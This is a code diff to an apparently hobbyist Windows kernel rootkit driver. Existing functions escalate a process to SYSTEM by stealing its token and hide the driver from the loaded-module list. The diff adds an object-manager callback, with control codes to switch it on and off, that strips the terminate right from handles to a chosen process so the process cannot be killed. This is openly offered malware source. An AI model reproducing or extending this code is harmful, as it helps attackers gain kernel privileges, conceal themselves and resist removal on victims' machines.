@@ -3,12 +3,41 @@
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
+#define PROCESS_TERMINATE 1
 // debug printing
 void debug_print(PCSTR text) {
     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
 }
+
+
 /*
 Functions 
+*/
+
+/*
+* DEFINITIONS FOR PROTECTION
+*/
+DRIVER_UNLOAD ProtectorUnload;
+DRIVER_DISPATCH ProtectorCreateClose, ProtectorDeviceControl;
+OB_PREOP_CALLBACK_STATUS PreOpenProcessOperation(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
+PVOID regHandle;
+ULONG protectedPid;
+OB_OPERATION_REGISTRATION operations[] = {
+{
+    PsProcessType,
+    OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
+    PreOpenProcessOperation, nullptr
+}
+};
+OB_CALLBACK_REGISTRATION reg = {
+  OB_FLT_REGISTRATION_VERSION,
+  1,
+  RTL_CONSTANT_STRING(L"12345.6879"),
+  nullptr,
+  operations
+};
+/*
+* END DEFNITIONS FOR PROTECTION
 */
 
 ULONG TOKEN_OFFSET = 0;
@@ -246,6 +275,7 @@ NTSTATUS ElevateProcess(UINT32 PID) {
     ObDereferenceObject(pSystemProcess);
     ObDereferenceObject(pTargetProcess);
 
+    debug_print("[*] Returning from function ElevateProcess.\n");
     return status;
 }
 
@@ -293,6 +323,21 @@ void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
     debug_print("[+] Driver is now hidden, spinlock released.\n");
 }
 
+OB_PREOP_CALLBACK_STATUS PreOpenProcessOperation(PVOID, POB_PRE_OPERATION_INFORMATION Info /* Info is what operation should be performed BEFORE the function is called, kind of like a Hook. */) {
+    if (Info->KernelHandle) {
+        return OB_PREOP_SUCCESS;
+    }
+
+    auto process = (PEPROCESS)Info->Object;
+    auto pid = HandleToUlong(PsGetProcessId(process));
+
+    // Protection - Removing the PROCESS_TERMINATE flag, essentially stripping the ability to terminate the process.
+    if (pid == protectedPid) {
+        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE; // Essentially, the opposite of process terminate should be performed.
+    }
+
+    return OB_PREOP_SUCCESS;
+}
 
 /*
 End Of Functions.
@@ -309,6 +354,10 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG ProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectProcessNotTerminate =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG DisableProtectProcessNotTerminate =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -333,7 +382,6 @@ namespace Rootkit {
 
     NTSTATUS device_control(PDEVICE_OBJECT device_object, PIRP Irp) {
         UNREFERENCED_PARAMETER(device_object);
-
         debug_print("[+] Device control called.\n");
 
         /* By default, it is unsuccessful. */
@@ -341,7 +389,12 @@ namespace Rootkit {
 
         // This will determine which code was sent from the user mode app.
         PIO_STACK_LOCATION stack_irp = IoGetCurrentIrpStackLocation(Irp);
-
+        auto size = stack_irp->Parameters.DeviceIoControl.InputBufferLength;
+        if (size % sizeof(ULONG) != 0) {
+            return status;
+        }
+        auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+        protectedPid = *data;
         // Access the request object sent from user mode.
         auto request = reinterpret_cast<Request*>(Irp->AssociatedIrp.SystemBuffer);
 
@@ -356,7 +409,6 @@ namespace Rootkit {
 
         // The target process we want to access, init here.
         static PEPROCESS target_process = nullptr;
-
         // finally handle the control code sent
         const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
         HANDLE pid = request->process_id;
@@ -380,6 +432,19 @@ namespace Rootkit {
             break;
         case codes::ProtectProcess:
             ProtectProcess(HandleToUlong(pid));
+            break;
+        case codes::ProtectProcessNotTerminate: 
+            NTSTATUS statusZZ;
+            statusZZ = ObRegisterCallbacks(&reg, &regHandle);
+            if (!NT_SUCCESS(statusZZ)) {
+                debug_print("[-] Failed to register callbacks, breaking.\n"); // for some reason it is ALWAYS failing to register callbacks and I can't understand wtf is the issue... fuck.
+                break;
+            }
+            debug_print("[+] Registering callback, success!\n");
+            break;
+        case codes::DisableProtectProcessNotTerminate:
+            ObUnRegisterCallbacks(regHandle);
+            debug_print("[*] Callbacks disabled by user.\n");
             break;
         default:
             // something is horribly wrong
